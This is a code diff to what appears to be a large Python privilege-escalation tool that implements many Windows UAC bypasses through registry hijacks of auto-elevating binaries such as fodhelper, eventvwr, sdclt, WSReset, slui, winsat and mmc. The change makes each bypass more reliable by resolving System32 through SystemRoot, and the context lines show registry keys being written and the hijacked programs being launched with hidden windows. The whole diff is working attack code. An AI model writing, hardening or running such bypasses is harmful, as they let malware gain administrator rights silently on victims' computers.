@@ -1576,7 +1576,8 @@ class FodhelperProtocolBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\fodhelper.exe")
+        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+        return super().is_available() and os.path.exists(fodhelper_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1591,9 +1592,10 @@ class FodhelperProtocolBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
-            # Execute fodhelper
+            # Execute fodhelper - use SystemRoot to avoid file system redirection
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\fodhelper.exe"],
+                [fodhelper_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1626,7 +1628,8 @@ class ComputerDefaultsBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\ComputerDefaults.exe")
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
+        return super().is_available() and os.path.exists(computerdefaults_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1640,8 +1643,9 @@ class ComputerDefaultsBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\ComputerDefaults.exe"],
+                [computerdefaults_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1674,7 +1678,8 @@ class EventViewerBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\eventvwr.exe")
+        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+        return super().is_available() and os.path.exists(eventvwr_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1687,8 +1692,9 @@ class EventViewerBypass(UACBypassMethod):
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
             winreg.CloseKey(key)
             
+            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\eventvwr.exe"],
+                [eventvwr_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1721,7 +1727,8 @@ class SdcltBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\sdclt.exe")
+        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+        return super().is_available() and os.path.exists(sdclt_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1735,8 +1742,9 @@ class SdcltBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\sdclt.exe"],
+                [sdclt_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1769,7 +1777,8 @@ class WSResetBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\WSReset.exe")
+        wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+        return super().is_available() and os.path.exists(wsreset_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1783,8 +1792,9 @@ class WSResetBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\WSReset.exe"],
+                [wsreset_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1817,7 +1827,8 @@ class SluiBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\slui.exe")
+        slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
+        return super().is_available() and os.path.exists(slui_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1831,8 +1842,10 @@ class SluiBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            # Use SystemRoot environment variable to avoid file system redirection on 32-bit Python
+            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\slui.exe"],
+                [slui_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1865,7 +1878,8 @@ class WinsatBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\winsat.exe")
+        winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
+        return super().is_available() and os.path.exists(winsat_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1879,8 +1893,9 @@ class WinsatBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\winsat.exe", "disk"],
+                [winsat_path, "disk"],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -2215,8 +2230,9 @@ def bypass_uac_fodhelper_protocol():
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
-            # Execute fodhelper to trigger bypass
-            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+            # Execute fodhelper to trigger bypass - use SystemRoot to avoid file system redirection
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+            subprocess.Popen([fodhelper_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2254,7 +2270,8 @@ def bypass_uac_computerdefaults():
         winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         winreg.CloseKey(key)
         
-        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'computerdefaults.exe')
+        subprocess.Popen([computerdefaults_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(2)
@@ -2556,7 +2573,8 @@ def bypass_uac_cor_profiler():
         
         try:
             # Execute a .NET application that will load our profiler
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2594,7 +2612,8 @@ def bypass_uac_com_handlers():
             winreg.CloseKey(key)
             
             # Trigger COM handler through mmc.exe
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2634,7 +2653,8 @@ def bypass_uac_volatile_env():
             winreg.CloseKey(key)
             
             # Execute auto-elevated process that uses environment variables
-            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+            subprocess.Popen([fodhelper_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2685,8 +2705,9 @@ def bypass_uac_slui_hijack():
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
             winreg.CloseKey(key)
             
-            # Execute slui.exe
-            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
+            # Execute slui.exe - use SystemRoot to avoid file system redirection
+            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
+            subprocess.Popen([slui_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2742,7 +2763,8 @@ def bypass_uac_eventvwr():
             winreg.CloseKey(key)
             
             # Execute eventvwr.exe
-            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
+            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+            subprocess.Popen([eventvwr_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2789,7 +2811,8 @@ def bypass_uac_sdclt():
             winreg.CloseKey(key)
             
             # Execute sdclt.exe which will call control.exe
-            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
+            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+            subprocess.Popen([sdclt_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2831,7 +2854,8 @@ def bypass_uac_wsreset():
             winreg.CloseKey(key)
             
             # Execute WSReset.exe
-            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
+            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+            subprocess.Popen([wsreset_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2995,7 +3019,8 @@ def bypass_uac_winsat():
             winreg.CloseKey(key)
             
             # Execute winsat.exe
-            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
+            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
+            subprocess.Popen([winsat_path, "disk"], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -3059,7 +3084,8 @@ def bypass_uac_mmcex():
                 f.write(msc_content)
             
             # Execute MMC with our fake snapin
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
+            mmc_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_exe_path, msc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -5209,7 +5235,8 @@ def bootstrap_fodhelper_bypass(command):
         winreg.CloseKey(key)
         
         # Execute fodhelper
-        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"],
+        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+        subprocess.Popen([fodhelper_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5236,7 +5263,8 @@ def bootstrap_eventvwr_bypass(command):
         winreg.CloseKey(key)
         
         # Execute eventvwr
-        subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"],
+        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+        subprocess.Popen([eventvwr_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5264,7 +5292,8 @@ def bootstrap_computerdefaults_bypass(command):
         winreg.CloseKey(key)
         
         # Execute computerdefaults
-        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"],
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
+        subprocess.Popen([computerdefaults_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5292,7 +5321,8 @@ def bootstrap_sdclt_bypass(command):
         winreg.CloseKey(key)
         
         # Execute sdclt
-        subprocess.Popen([r"C:\Windows\System32\sdclt.exe"],
+        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+        subprocess.Popen([sdclt_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
